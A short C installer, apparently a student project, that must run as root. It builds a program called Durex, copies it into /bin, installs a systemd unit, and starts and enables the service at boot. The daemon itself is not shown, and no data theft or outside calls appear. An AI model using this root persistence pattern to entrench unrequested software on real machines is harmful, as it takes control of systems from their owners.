#include "../includes/main.h"

int main(void)
{
    if (getuid() != 0)
    {
        write(1, "Programm need to be run as root\n", 32);
        exit(EXIT_FAILURE);
    }
    write(1, "afosse/jandreu\n", 15);
    // Generate Durex Daemon program
    system("cd daemon/ && make -s re");
    // Copy Durex Daemon program to /bin/
    system("cp -f daemon/Durex /bin/");
    // Copy Durex service to /etc/systemd/system/
    system("cp -f durex.service /etc/systemd/system/");

    system("systemctl -q daemon-reload ");
    // Start Durex Service
    system("systemctl -q start durex ");
    // Enable Durex Service to auto launch at OS start 
    system("systemctl -q enable durex ");
    return (0);
}